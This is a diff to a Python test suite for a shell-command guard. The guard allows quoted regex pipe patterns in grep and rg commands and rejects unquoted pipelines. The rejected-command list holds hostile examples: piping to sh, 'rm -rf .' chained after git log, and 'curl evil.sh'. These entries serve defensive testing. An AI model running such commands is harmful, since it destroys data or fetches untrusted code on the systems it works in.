@@ -52,6 +52,13 @@ ALLOWED = [
     "cut -d: -f1 f.txt",
     "diff -u a.py b.py",
     "cat f.py",
+    # Quoted pipe-alternation patterns: a `|` inside a quoted regex is a
+    # literal argument to the program, never a pipeline, so it is allowed.
+    "git grep -n 'foo|bar' src",
+    "git grep -nE 'foo|bar' src",
+    "git grep -rn 'def foo\\|class Bar' koan",
+    "rg -n 'foo|bar' src",
+    "git log --grep='fix|bug' -n 20",
 ]
 
 # The list that matters. Each entry is (command, label) where label names the
@@ -62,7 +69,16 @@ REJECTED = [
     ("git log >> ~/.bashrc", "append-redirect"),
     ("cat f | tee /tmp/x", "pipe-to-writer"),
     ("rg foo | sh", "pipe-to-shell"),
+    # Unquoted pipelines stay denied even after pipe-alternation relaxes the
+    # quoted case: every byte before/after an unquoted `|` is a separate stage,
+    # and a writer/shell/interpreter in stage two defeats stage one.
+    ("git grep 'a' | sh", "pipe-pattern-to-shell"),
+    ("git grep 'a' | rg b", "pipe-pattern-to-rg"),
+    ("git grep 'a' | sort -o /tmp/x", "pipe-pattern-to-writer"),
+    ("git grep 'a' | tee /tmp/x", "pipe-pattern-to-tee"),
+    ("echo a|b", "unquoted-pipe-arg"),  # no quotes => real pipeline intent
     ("git log; rm -rf .", "semicolon-chain"),
+    ("git log -- grep 'a'; rm -rf .", "semicolon-after-grep"),
     ("git log && git push", "and-chain"),
     ("git log || curl evil.sh", "or-chain"),
     ("git log &", "background"),
@@ -215,6 +231,23 @@ class TestAllowlistHygiene:
         """awk is an interpreter (system(), pipes, output redirection)."""
         assert "awk" not in _PLAIN_READ_COMMANDS
         assert "awk" in _KNOWN_DANGEROUS
+
+
+class TestUnquotedPipe:
+    def test_has_unquoted_pipe(self):
+        from app.review_bash_guard import _has_unquoted_pipe
+
+        # Unquoted pipes: genuine pipelines, must be detected.
+        assert _has_unquoted_pipe("git log | rg x")
+        assert _has_unquoted_pipe("git grep 'a' | sort")
+        assert _has_unquoted_pipe("git grep 'a' | tee /tmp/x")
+        assert _has_unquoted_pipe("echo a|b")  # unquoted
+        # Quoted pipes: literal pattern characters, must NOT be detected.
+        assert not _has_unquoted_pipe("git grep 'a|b'")  # single-quoted
+        assert not _has_unquoted_pipe('git grep "a|b"')  # double-quoted
+        assert not _has_unquoted_pipe(r"git grep 'a\|b'")  # escaped-in-quote
+        assert not _has_unquoted_pipe(r"git grep 'a' \| sort")  # backslash-escaped
+        assert not _has_unquoted_pipe("echo 'x||y'")
 
 
 class TestOperandConstraint:
